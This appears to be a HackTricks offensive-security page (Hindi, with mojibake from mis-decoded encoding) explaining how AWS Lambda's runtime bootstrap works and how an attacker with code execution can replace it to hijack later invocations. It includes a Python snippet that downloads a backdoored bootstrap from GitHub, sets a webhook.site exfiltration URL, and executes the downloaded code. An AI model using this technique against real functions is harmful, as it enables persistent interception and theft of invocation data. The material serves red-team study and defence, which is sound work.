# AWS - Lambda рдЕрдиреБрд░реЛрдз рдЪреБрд░рд╛рдирд╛

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** (https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## Lambda рдлреНрд▓реЛ

<figure><img src="../../../../.gitbook/assets/image (152).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer** рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ рдЬреЛ рдХрдВрдЯреЗрдирд░ рдХреЗ рдмрд╛рд╣рд░ рд╣реИ рдЬреЛ **init** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **рдЖрдордВрддреНрд░рдг** рднреЗрдЬрддреА рд╣реИред
2. рдЗрдирд┐рдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкреЛрд░реНрдЯ **9001** рдкрд░ рд╕реБрди рд░рд╣реА рд╣реИ рдФрд░ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд░рд╣реА рд╣реИ:
* **`/2018-06-01/runtime/invocation/next`** тАУ рдЕрдЧрд▓реЗ рдЖрдордВрддреНрд░рдг рдШрдЯрдирд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** тАУ рдЖрдордВрддреНрд░рдг рдХреЗ рд▓рд┐рдП рд╣реИрдВрдбрд▓рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╡рд╛рдкрд╕ рдХрд░реЗрдВ
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** тАУ рдПрдХ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рддреНрд░реБрдЯрд┐ рд╡рд╛рдкрд╕ рдХрд░реЗрдВ
3. **bootstrap.py** рдПрдХ рд▓реВрдк рд╣реИ рдЬреЛ рдЗрдирд┐рдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЖрдордВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╣реИрдВрдбрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛрдб рдХреЛ рдмреБрд▓рд╛рддрд╛ рд╣реИ (**`/next`**)ред
4. рдЕрдВрддрддрдГ, **bootstrap.py** рдЗрдирд┐рдЯ рдХреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рднреЗрдЬрддрд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ bootstrap рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛрдб рдХреЛ рдПрдХ рдореЙрдбреНрдпреВрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛрдб рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХреЛрдИ рднреА рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╣реЛ рд░рд╣рд╛ рд╣реИред

## Lambda рдЕрдиреБрд░реЛрдз рдЪреБрд░рд╛рдирд╛

рдЗрд╕ рд╣рдорд▓реЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдпрд╣ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛрдб рдХреЛ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА **`bootstrap.py`** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛрдб рдХреЛ рджреБрд░реБрдкрдпреЛрдЧреА **`bootstrap.py`** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ рдЪрд▓рд╛рдПрдВ рдЬреЛ рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЕрдиреБрд░реЛрдз рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░рддреА рд╣реИред рдЗрд╕ рддрд░рд╣, **рджреБрд░реБрдкрдпреЛрдЧреА bootstrap** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╢реБрд░реВ рд╣реЛ рдЬрд╛рдПрдЧреА **init рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдирд╛** рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрдмрдХрд┐ **рд╡рд┐рдзрд┐** bootstrap рджреБрд░реБрдкрдпреЛрдЧреА рдПрдХ рджреМрд░рд╛рди рдЪрд▓ рд░рд╣реА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЗрдирд┐рдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЕрдиреБрд░реЛрдз рдирд╣реАрдВ рдХрд░реЗрдЧреАред

рдпрд╣ рдПрдХ рд╕рд░рд▓ рдХрд╛рд░реНрдп рд╣реИ рдЬреИрд╕реЗ рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдХреЛрдб рд╡рд╛рд╕реНрддрд╡рд┐рдХ **`bootstrap.py`** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░:

* **рд╡рд░реНрддрдорд╛рди рдЖрдордВрддреНрд░рдг рдХреЗ рдирдХрд▓реА рдкрд░рд┐рдгрд╛рдо рдХреЛ рдЗрдирд┐рдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рднреЗрдЬреЗрдВ**, рддрд╛рдХрд┐ рдЗрдирд┐рдЯ рд╕реЛрдЪреЗ рдХрд┐ bootstrap рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдФрд░ рдЖрдордВрддреНрд░рдг рдХреЗ рд▓рд┐рдП рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░ рд░рд╣реА рд╣реИред
* рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдирд╛ рдЪрд╛рд╣рд┐рдП **`/${invoke-id}/response`**ред
* рдЗрдиреНрд╡реЛрдХ-рдЖрдИрдбреА рдХреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ **`bootstrap.py`** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕реНрдЯреИрдХ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ [**inspect**](https://docs.python.org/3/library/inspect.html) python рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ (рдЬреИрд╕рд╛ [рдпрд╣рд╛рдБ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)) рдпрд╛ рдлрд┐рд░ рдЗрд╕реЗ рдлрд┐рд░ рд╕реЗ рдЕрдиреБрд░реЛрдз рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **`/2018-06-01/runtime/invocation/next`** (рдЬреИрд╕рд╛ [рдпрд╣рд╛рдБ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py))ред
* рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА **`boostrap.py`** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдЬреЛ рдЕрдЧрд▓реЗ рдЖрдордВрддреНрд░рдгреЛрдВ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░реЗрдЧреА
* рдЫрд▓рд╛рдкрди рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд▓реИрдВрдмрдбрд╛ рдЖрдордВрддреНрд░рдг рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХрдВрдЯреНрд░реЛрд▓ C2 рдХреЛ рднреЗрдЬрдирд╛ рдФрд░ рдлрд┐рд░ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред
* рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рдХрд╛рдлреА рд╣реИ рдХрд┐ **`bootstrap.py`** рдХрд╛ рдореВрд▓ рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдП рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдпрд╛ [**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py) рд╕реЗ, рджреБрд░реБрдкрдпреЛрдЧреА рдХреЛрдб рдЬреЛрдбрд╝реЗрдВ рдФрд░ рд╡рд░реНрддрдорд╛рди рд▓реИрдореНрдмрдбрд╛ рдЖрдордВрддреНрд░рдг рд╕реЗ рдЗрд╕реЗ рдЪрд▓рд╛рдПрдВред

### рд╣рдорд▓реЗ рдХреЗ рдХрджрдо

1. рдПрдХ **RCE** рднреЗрджрдирдпреЛрдЧреНрдпрддрд╛ рдЦреЛрдЬреЗрдВред
2. рдПрдХ **рджреБрд░реБрдкрдпреЛрдЧреА** **bootstrap** рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ (рдЙрджрд╛ред [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py))
3. **рджреБрд░реБрдкрдпреЛрдЧреА** bootstrap рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВред

рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдЗрди рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
## рд╕рдВрджрд░реНрдн

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
